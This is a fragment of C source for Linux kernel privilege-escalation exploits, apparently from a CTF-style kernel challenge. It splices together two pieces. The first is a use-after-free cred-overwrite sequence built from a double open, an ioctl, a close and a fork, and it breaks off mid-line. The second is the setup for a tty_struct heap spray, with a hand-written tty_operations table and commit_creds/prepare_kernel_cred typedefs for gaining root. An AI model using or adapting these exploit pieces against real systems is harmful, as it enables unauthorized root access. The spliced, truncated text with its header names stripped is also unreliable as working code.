    18. fd1 = open(DEV_NAME, O_RDWR);
    19. fd2 = open(DEV_NAME, O_RDWR);
    20. 
    21. ret = ioctl(fd1, 0x10001, CRED_SIZE);
    22. 
    23. close(fd1);
    24. 
    25. int now_uid = 1000;//当前uid为1000
    26. int pid = fork();
    27. if (pid 
    2.  #include 
    3.  #include 
    4.  #include 
    5.  #include 
    6.  #include 
    7.  #include 
    8.  #include 
    9.  #include 
    10.#include 
    11.#include 
    12.#include 
    13.#include 
    14.
    15.#define TTY_STRUCT_SIZE 0x2e0
    16.#define SPRAY_ALLOC_TIMES 0x100
    17.
    18.int spray_fd[0x100];
    19.
    20./*
    21.
    22.tty_struct:
    23. int magic; // 4
    24. struct kref kref; // 4
    25. struct device *dev; // 8
    26. struct tty_driver *driver; // 8
    27. const struct tty_operations *ops; // 8, offset = 4 + 4 + 8 + 8 = 24
    28. [...]
    29.
    30.*/
    31.
    32.struct tty_operations {
    33. struct tty_struct * (*lookup)(struct tty_driver *driver,
    34. struct file *filp, int idx);
    35. int (*install)(struct tty_driver *driver, struct tty_struct *tty);
    36. void (*remove)(struct tty_driver *driver, struct tty_struct *tty);
    37. int (*open)(struct tty_struct * tty, struct file * filp);
    38. void (*close)(struct tty_struct * tty, struct file * filp);
    39. void (*shutdown)(struct tty_struct *tty);
    40. void (*cleanup)(struct tty_struct *tty);
    41. int (*write)(struct tty_struct * tty,
    42. const unsigned char *buf, int count);
    43. int (*put_char)(struct tty_struct *tty, unsigned char ch);
    44. void (*flush_chars)(struct tty_struct *tty);
    45. int (*write_room)(struct tty_struct *tty);
    46. int (*chars_in_buffer)(struct tty_struct *tty);
    47. int (*ioctl)(struct tty_struct *tty,
    48. unsigned int cmd, unsigned long arg);
    49. long (*compat_ioctl)(struct tty_struct *tty,
    50. unsigned int cmd, unsigned long arg);
    51. void (*set_termios)(struct tty_struct *tty, struct ktermios * old);
    52. void (*throttle)(struct tty_struct * tty);
    53. void (*unthrottle)(struct tty_struct * tty);
    54. void (*stop)(struct tty_struct *tty);
    55. void (*start)(struct tty_struct *tty);
    56. void (*hangup)(struct tty_struct *tty);
    57. int (*break_ctl)(struct tty_struct *tty, int state);
    58. void (*flush_buffer)(struct tty_struct *tty);
    59. void (*set_ldisc)(struct tty_struct *tty);
    60. void (*wait_until_sent)(struct tty_struct *tty, int timeout);
    61. void (*send_xchar)(struct tty_struct *tty, char ch);
    62. int (*tiocmget)(struct tty_struct *tty);
    63. int (*tiocmset)(struct tty_struct *tty,
    64. unsigned int set, unsigned int clear);
    65. int (*resize)(struct tty_struct *tty, struct winsize *ws);
    66. int (*set_termiox)(struct tty_struct *tty, struct termiox *tnew);
    67. int (*get_icount)(struct tty_struct *tty,
    68. struct serial_icounter_struct *icount);
    69. const struct file_operations *proc_fops;
    70.};
    71.
    72.typedef int __attribute__((regparm(3)))(*commit_creds_func)(unsigned long cred);
    73.typedef unsigned long __attribute__((regparm(3))) (*prepare_kernel_cred_func)(unsigned long cred);